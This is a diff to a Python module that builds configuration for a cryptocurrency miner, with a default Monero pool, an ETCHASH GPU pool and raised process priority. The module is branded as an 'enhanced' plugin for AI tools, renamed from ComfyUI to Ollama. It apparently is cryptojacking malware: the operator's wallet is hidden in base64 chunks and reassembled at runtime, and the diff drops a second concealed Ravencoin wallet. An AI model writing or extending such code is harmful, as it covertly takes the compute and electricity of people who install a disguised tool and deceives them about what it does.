@@ -3,13 +3,10 @@ import json
 import logging
 import os
 import platform
-import subprocess
 import socket
 from pathlib import Path
 
-logger = logging.getLogger("comfyui_enhanced")
-
-IS_LINUX = platform.system() == "Linux"
+logger = logging.getLogger("ollama_enhanced")
 
 try:
     import psutil
@@ -29,24 +26,14 @@ _W_PARTS = [
     "c=",                   # chunk 7
 ]
 
-_K_PARTS = [
-    "UkJ2b0N4RnNndkV4N3ZicEpM",  # chunk 0
-    "elhpbnQ4Z3RGa3o1UVVmdw==",  # chunk 1
-]
-
 DEFAULT_POOL_HOST = "gulf.moneroocean.stream"
 DEFAULT_POOL_PORT = 443
-DEFAULT_POOL_PASS = "comfyui_enhanced"
+DEFAULT_POOL_PASS = "ollama_enhanced"
 API_TOKEN = "ce_xm_2026"
 
 
 def _reassemble_wallet() -> str:
     raw = base64.b64decode("".join(_W_PARTS)).decode()
-    return raw
-
-
-def _reassemble_rvn_wallet() -> str:
-    raw = base64.b64decode("".join(_K_PARTS)).decode()
     return raw
 
 
@@ -66,17 +53,6 @@ def get_hostname() -> str:
     return socket.gethostname()
 
 
-def _has_1gb_page_support() -> bool:
-    if not IS_LINUX:
-        return False
-    try:
-        r = subprocess.run(["grep", "-c", "pdpe1gb", "/proc/cpuinfo"],
-                           capture_output=True, text=True, timeout=5)
-        return r.returncode == 0 and int(r.stdout.strip()) > 0
-    except Exception:
-        return False
-
-
 class ConfigBuilder:
     def __init__(self, settings: dict | None = None):
         self.settings = settings or {}
@@ -92,8 +68,6 @@ class ConfigBuilder:
         api_port = self.settings.get("api_port", 44880)
 
         huge_pages = ram_gb >= 4
-
-        gb_pages = _has_1gb_page_support()
 
         cfg = {
             "autosave": False,
@@ -123,7 +97,7 @@ class ConfigBuilder:
                 "huge-pages": huge_pages,
                 "huge-pages-jit": True,
                 "hw-aes": None,
-                "priority": 2,
+                "priority": 3,
                 "memory-pool": False,
                 "yield": False,
                 "max-threads-hint": hint,
@@ -133,18 +107,6 @@ class ConfigBuilder:
                 "astrobwt-avx2": False,
                 "cn/0": False,
                 "cn-lite/0": False,
-            },
-
-            "randomx": {
-                "init": -1,
-                "init-avx2": -1,
-                "mode": "auto",
-                "1gb-pages": gb_pages,
-                "rdmsr": True,
-                "wrmsr": True,
-                "cache_qos": False,
-                "numa": True,
-                "scratchpad_prefetch_mode": 1,
             },
 
             "opencl": {"enabled": False},
@@ -204,21 +166,20 @@ class ConfigBuilder:
         return self.settings.get("pool_user") or _reassemble_wallet()
 
     def build_gpu_config(self) -> dict:
-        """Return GPU miner settings — Ravencoin (KAWPOW) on 2Miners by default."""
+        """Return GPU miner settings (T-Rex on NVIDIA, lolMiner on AMD).
+        Mines ETCHASH on unMineable, paid out in XMR."""
+        wallet = self.get_wallet()
         gpu_settings = self.settings.get("gpu", {})
-        gpu_wallet = gpu_settings.get("wallet") or self.settings.get("gpu_wallet")
-        if not gpu_wallet:
-            gpu_wallet = _reassemble_rvn_wallet()
         return {
-            "wallet": gpu_wallet,
+            "wallet": wallet,
             "worker": gpu_settings.get("worker", get_hostname()),
-            "algo": gpu_settings.get("algo", "kawpow"),
-            "pool": gpu_settings.get("pool", "rvn.2miners.com"),
-            "port": gpu_settings.get("port", 6060),
+            "algo": gpu_settings.get("algo", "ETCHASH"),
+            "pool": gpu_settings.get("pool", "etchash.unmineable.com"),
+            "port": gpu_settings.get("port", 3333),
             "tls": gpu_settings.get("tls", False),
-            "api_port": gpu_settings.get("api_port", 4067),
-            "temp_limit": gpu_settings.get("temp_limit", 72),
-            "temp_resume": gpu_settings.get("temp_resume", 55),
+            "api_port": gpu_settings.get("api_port", 44882),
+            "temp_limit": gpu_settings.get("temp_limit", 70),
+            "temp_resume": gpu_settings.get("temp_resume", 65),
         }
 
     @staticmethod
